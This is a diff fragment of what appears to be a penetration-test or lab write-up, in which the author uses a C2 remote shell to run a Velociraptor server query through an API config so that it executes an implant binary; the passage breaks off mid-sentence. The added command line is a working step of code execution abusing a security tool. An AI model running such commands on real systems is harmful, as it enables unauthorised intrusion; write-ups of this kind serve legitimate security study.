@@ -724,5 +724,11 @@ After some research and reading of the docs, i see i need to create a api config
 So since the way the command i need to run is formatted, i wont be able to run this as a BOF in my beacon, instead ill open a remote shell in adaptix, then running the command there
 
 ```python
-
+C:\Program Files\VelociraptorServer>.\velociraptor-v0.72.4-windows-amd64.exe -a C:\programdata\api.config.yaml query "SELECT * FROM execve(argv=['C:\\programdata\\agent.x64.exe'])"
 ```
+
+This is the command i ran in the remote shell, then after a second
+
+![](Pasted%20image%2020260812223055.png)
+
+I now have a 
